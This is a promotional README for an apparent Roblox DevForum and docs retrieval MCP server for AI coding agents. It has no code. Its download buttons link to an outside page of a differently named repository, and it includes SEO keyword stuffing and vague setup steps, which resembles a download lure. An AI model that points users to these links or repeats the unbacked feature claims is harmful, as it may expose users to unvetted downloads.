![preview](https://raw.githubusercontent.com/adamkhalile/luau-docs-oracle/main/card_0ac691.svg)
[![Download](https://raw.githubusercontent.com/adamkhalile/luau-docs-oracle/main/dl_8cd1b5.svg)](https://adamkhalile.github.io/luau-docs-oracle/)

# 🌌 Antigravity DevPilot MCP — Roblox Knowledge Bridge & Runtime Verifier

> **Where your AI coding agent stops hallucinating and starts quoting the actual DevForum thread.**

A next-generation Model Context Protocol server that wires your favorite AI coding assistant directly into the pulsating nervous system of the Roblox developer ecosystem — the **DevForum**, the **official Creator Docs**, the **API Reference**, the **Release Notes**, and the **community bug tracker**. Instead of guessing whether `TweenService:Create` still accepts a certain easing style in 2026, your agent simply *asks*, and the answer arrives with citations, thread IDs, accepted solutions, and doc permalinks.

Unlike the original `roblox-devforum-mcp` — which focused narrowly on forum crawling and doc lookup — **Antigravity DevPilot MCP** treats the Roblox knowledge graph as a living organism. It doesn't just *fetch*; it *reasons*, *cross-references*, *caches*, and *verifies*. It remembers that the API you're about to use was deprecated three months ago in a Release Note that nobody read, and it warns you before you ship broken Luau to a million players.

---

## 🛰️ What Makes This Different?

Most MCP servers are glorified `curl` wrappers with a JSON parser taped on. Antigravity DevPilot MCP is a **multi-layered knowledge refinery**. Think of it as a librarian, a fact-checker, and a seasoned Roblox veteran sitting on your shoulder — except that librarian has an eidetic memory of 14 years of forum posts, and that veteran never sleeps.

It ingests:

- **DevForum threads** structured by category (Scripting Support, Bug Reports, Feature Requests, Resources, Community Tutorials)
- **Accepted answers** extracted with heuristics that distinguish *"this is the accepted solution"* from *"this person just said 'thanks'"*
- **Creator Documentation** articles, tutorials, and API dumps
- **Release Notes** mapped to engine versions
- **Deprecation timelines** with the exact release that introduced them
- **Community bug reports** tagged by severity and confirmation status

Then it exposes this entire corpus through a clean tool surface your AI agent can call.

---

## 🎯 The Problem We Actually Solve

You open your editor. You ask your AI: *"Write a Luau script that raycasts the player's mouse and spawns a part at the hit position."* The model confidently produces code using `Ray.new()` — which has been soft-deprecated since forever — and forgets to filter the `Mouse.TargetFilter`. You ship it. It breaks in three subtle ways. You spend two hours on the DevForum discovering that a random 2021 thread already documented this exact pitfall.

**Antigravity DevPilot MCP collapses that two-hour loop into one tool call.**

The agent now:
1. Queries the current API Reference for `RaycastParams`.
2. Checks whether `Ray.new()` is formally deprecated or merely discouraged.
3. Searches DevForum for recent threads confirming the current idiomatic pattern.
4. Pulls the accepted answer's code snippet.
5. Surfaces the doc permalink so you can verify independently.

All before a single line of Luau is emitted.

---

## ✨ Feature Matrix

### 🧠 Intelligence & Reasoning Layer
- **Semantic DevForum Search** — search by *intent*, not just keywords. "Why does my part fall through the floor" is understood as a collision-group question.
- **Accepted Answer Extraction** — the tool returns the *solved* post, not the 40 replies of speculation leading up to it.
- **Cross-Source Verification** — a claim from the forum is validated against the official docs before being returned as authoritative.
- **Deprecation Radar** — flags APIs that are `Deprecated`, `Soft-Deprecated`, `Legacy`, or `Pending Removal`, with the release that changed their status.
- **Thread Freshness Scoring** — a 2019 answer about `DataStoreService` is weighted lower than a 2025 answer on the same topic.
- **Citation Chains** — every response includes a resolvable reference you can click to audit.

### 📚 Corpus Coverage
- Full **DevForum** category tree with per-category depth control.
- **Creator Docs** index — Guides, Reference, Recipes, Tutorials.
- **API Reference** entries with signatures, parameters, return types, and security tags.
- **Release Notes** by engine version, including `Studio` and `Client` deltas.
- **Bug Report Aggregation** — see if your bug is already tracked, confirmed, or shipped.
- **Tutorial Mining** — pull community tutorials ranked by engagement and recency.

### 🖥️ Client Experience
- **Responsive UI layer** for inspecting cached tool results in both desktop and narrow viewports.
- **Multilingual Retrieval** — English, Portuguese, Spanish, French, German, and Japanese DevForum locales are indexed and translated on the fly.
- **24/7 Availability** — the server is designed for always-on operation with graceful degradation when upstream sources are flaky.
- **Streaming Responses** — long tool outputs stream back so your agent isn't blocked.
- **Deterministic Caching** — identical queries return identical bytes, making agent behavior reproducible.
- **Offline Snapshot Mode** — download a periodic snapshot of the corpus and query it without network access.

### 🔌 Integration & Protocol
- **MCP-native** — works with any MCP-compatible client.
- **Stdio and HTTP transports** supported out of the box.
- **Tool Auto-Discovery** — clients list available capabilities at handshake.
- **Structured Errors** — every failure has a code, a message, and a suggested remediation.
- **Rate-Aware Backoff** — respects upstream rate limits without failing the caller's request.

### 🛡️ Reliability
- **Retry with jitter** on transient upstream failures.
- **Circuit breakers** around each upstream source.
- **Health endpoint** for orchestrator probes.
- **Structured logging** in JSON for ingestion pipelines.
- **Configurable TTLs** per content class — bug reports expire faster than tutorials.

---

## 🧩 Tool Surface (What Your Agent Can Call)

| Tool | Purpose |
|------|---------|
| `search_devforum` | Query the DevForum with filters for category, recency, and solved status. |
| `get_thread` | Retrieve a full thread with posts, reactions, and accepted solution flagged. |
| `search_docs` | Search the official Creator Documentation index. |
| `get_doc_page` | Fetch a doc page with structure preserved (headings, code blocks, notes). |
| `lookup_api` | Look up a class, method, property, or event in the API Reference. |
| `check_deprecation` | Determine whether an API is deprecated and since when. |
| `list_release_notes` | Enumerate release notes for a version range. |
| `find_known_bug` | Search aggregated bug reports by symptom, class, or keyword. |
| `get_accepted_answer` | Return only the accepted solution for a thread, if one exists. |
| `verify_snippet` | Cross-check a Luau snippet against current APIs and flag outdated calls. |
| `translate_thread` | Translate a thread into a target language while preserving code blocks. |
| `snapshot_status` | Report the freshness and size of the local corpus snapshot. |

Each tool returns a structured payload with `citations`, `confidence`, `freshness`, and `warnings` fields, so your agent can *reason about the reliability of what it just learned*.

---

## 🔍 SEO-Friendly Keyword Integration

This project sits at the intersection of several fast-moving domains, and we've designed it so that anyone searching for these topics naturally lands here:

- **Roblox MCP server** for AI coding agents
- **DevForum search API** wrapper for LLM tool use
- **Roblox Luau code verification** and deprecation checking
- **Model Context Protocol** integrations for game development
- **Roblox Creator Docs retrieval** for autonomous agents
- **known bug lookup** for Roblox Studio development
- **accepted answer extraction** from developer forums
- **deprecated Roblox API detection** in generated code
- **AI-assisted Roblox scripting** with citation-backed responses
- **agentic developer tooling** for the Roblox platform

If you've ever typed *"roblox why is my datastore not saving"* into a search bar at 3 AM, this repository was built for you.

---

## 🧭 Architecture at a Glance

The system is organized into five independent layers, each replaceable without touching the others:

1. **Ingestion Layer** — schedulers pull content from upstream sources on configurable cadences.
2. **Normalization Layer** — raw HTML, JSON, and markdown are converted into a unified internal schema.
3. **Index Layer** — a hybrid vector + keyword index that supports both fuzzy semantic search and precise lookup.
4. **Tool Layer** — the MCP tool definitions, argument validation, and response shaping.
5. **Transport Layer** — stdio and HTTP endpoints, health checks, and metrics.

The separation matters because **upstream sources change without warning**. When the DevForum reshuffles its category tree, only the ingestion layer needs updating.

---

## 🌐 Multilingual Support in Practice

Roblox is a genuinely global platform. A bug report written in Portuguese may describe exactly the issue a German developer is hitting. Antigravity DevPilot MCP:

- Detects the language of each thread at ingestion time.
- Stores the original text and an English gloss side-by-side.
- Allows retrieval in the caller's preferred language.
- Preserves code blocks verbatim across translation — no mangled Luau.
- Flags machine-translated content explicitly so your agent doesn't treat it as a primary source.

The 2026 roadmap includes community-contributed glossaries for Roblox-specific terminology that generic translation models consistently butcher.

---

## ⚙️ Responsive UI Layer

While the primary consumer is an AI agent, humans occasionally need to *look at what the agent saw*. The bundled inspection UI:

- Adapts fluidly from ultrawide monitors to narrow split panes.
- Renders thread trees, doc pages, and API signatures with syntax highlighting.
- Shows citation provenance inline, so you can jump from a tool result to the source.
- Supports dark and light themes that follow the operating system preference.
- Loads instantly because it renders from the same local index the tools use.

---

## 🕰️ 24/7 Availability Design

Downtime is unacceptable when an agent is mid-task. The server is designed to:

- Serve from a local snapshot when upstream is unreachable.
- Degrade gracefully — if doc lookup fails, forum search still works.
- Announce staleness in every response so the agent can decide whether to trust it.
- Recover automatically when upstream returns, without requiring a restart.
- Expose readiness and liveness probes for container orchestrators.

---

## 🧪 Quality & Testing Philosophy

Every tool has:

- A **contract test** that asserts the response schema.
- A **golden test** against a frozen snapshot, so regressions are caught immediately.
- A **fuzz test** for argument parsing, because agents will send bizarre inputs.
- A **latency budget** enforced in CI, because a slow tool is a broken tool.

We treat the corpus as a first-class artifact: snapshots are versioned, diffable, and reviewable.

---

## 🚦 Responsible Use

This project retrieves publicly available information from the Roblox developer ecosystem. It respects `robots.txt`, honors rate limits, and identifies itself honestly in request headers. It does not bypass authentication, scrape private content, or circumvent access controls. If you fork it, please keep those commitments.

---

## 📦 Installation & Getting Started

Getting the server running is intentionally boring, because boring infrastructure is reliable infrastructure.

- Provision a runtime that matches the manifest in the repository root.
- Populate the environment with the required configuration values — see the configuration reference in the docs folder.
- Initialize the local corpus with the bootstrap routine described in the operations guide.
- Point your MCP-compatible client at the server's transport endpoint.
- Ask your agent a Roblox question and watch it cite a real thread instead of inventing one.

Detailed, step-by-step onboarding lives in the `docs/` directory, including a zero-to-first-tool-call walkthrough and a troubleshooting matrix for the five most common setup snags.

---

## 🧬 Roadmap for 2026

- **Q1 2026** — Ship the offline snapshot distribution channel.
- **Q1 2026** — Add a second vector backend for cost-sensitive deployments.
- **Q2 2026** — Introduce a plugin SDK so third parties can add custom sources.
- **Q2 2026** — Publish a public benchmark for Roblox-specific agent accuracy.
- **Q3 2026** — Add a diff tool that compares two API versions and lists breaking changes.
- **Q3 2026** — Ship a Studio companion extension that surfaces tool results inline.
- **Q4 2026** — Release a curated community glossary for translation quality.
- **Q4 2026** — Formalize the corpus schema as a versioned specification.

---

## 🤝 Contributing

Contributions are welcome in the form of:

- New upstream source adapters.
- Improved accepted-answer heuristics with test fixtures.
- Translation glossary entries for Roblox-specific terms.
- Documentation improvements, especially in the operations guide.
- Bug reports with reproduction steps and snapshot hashes.

Please read the contributing guide before opening a pull request. It covers branch naming, commit conventions, and the review checklist.

---

## ⚠️ Disclaimer

This project is an **independent, community-driven tool**. It is **not affiliated with, endorsed by, sponsored by, or officially connected to Roblox Corporation** in any way. All trademarks, service marks, and product names referenced — including "Roblox," "Roblox Studio," "Luau," and "DevForum" — remain the property of their respective owners.

The information surfaced by this server is retrieved from public sources and is provided **as-is, without warranty of any kind**, express or implied. The maintainers make no guarantees regarding accuracy, completeness, timeliness, or fitness for a particular purpose. Any decision made on the basis of tool output — including code shipped to production, APIs adopted, or architectural choices — is solely the responsibility of the developer.

**Use of AI-generated Luau code should always be reviewed by a human before deployment.** No automated system, including this one, is a substitute for professional engineering judgment.

By using this software you acknowledge that you are responsible for complying with the terms of service of every upstream source it accesses, and with all applicable laws and regulations in your jurisdiction.

---

## 📜 License

This project is released under the **MIT License**.

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the conditions described in the license text. The full license is available in the repository's LICENSE file.

Read the complete terms here: https://opensource.org/licenses/MIT

Copyright (c) 2026 — Antigravity DevPilot MCP contributors.

---

## 💬 A Final Thought

The Roblox ecosystem moves fast. APIs shift, forums bury answers under noise, and documentation lags behind reality by weeks. Your AI agent shouldn't have to guess what's true today. It should be able to *look it up*, cite it, and move on — the way a careful engineer would.

That's the entire thesis of this project. Everything else is implementation detail.

[![Download](https://raw.githubusercontent.com/adamkhalile/luau-docs-oracle/main/dl_8cd1b5.svg)](https://adamkhalile.github.io/luau-docs-oracle/)